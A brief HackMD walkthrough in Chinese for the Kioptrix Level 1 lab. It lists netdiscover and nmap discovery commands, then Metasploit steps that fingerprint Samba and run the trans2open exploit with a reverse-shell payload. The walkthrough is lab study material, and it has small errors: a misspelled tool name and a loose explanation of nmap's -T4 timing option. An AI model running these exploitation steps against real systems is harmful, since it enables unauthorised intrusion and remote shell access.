KIOPTRIX: LEVEL 1 - HackMD

KIOPTRIX: LEVEL 1

題目網址

Step 1 - 找到靶機IP

ifconfig - 查看自己的IP


sudo netdisconver -r 10.0.2.0/16 - 查看本地端的IP尋找靶機
-r 指定


sudo nmap -A -T4 10.0.2.4 - 該主機(可以是網址也可以是ip)有開的常見port以及作業系統和版本資訊
-A(All) - 全面系統檢測、啟用腳本檢測、掃描等
-T4 - 針對TCP端口禁止動態掃描延遲超過10ms



Step 2 - 找尋滲透測試進入點

msfconsole


search smb_version


use 0


show options


set rhosts 靶機IP


show options


run - 運行



Step3 - 搜索漏洞

search Samba 2.2.1a - 搜尋Samba 2.2.1a有哪些可以用的腳本


search trans2open


use 1


show options


set rhosts 靶機IP


show options


show payloads


set payload linux/x86/shell_reverse_tcp


show options


run
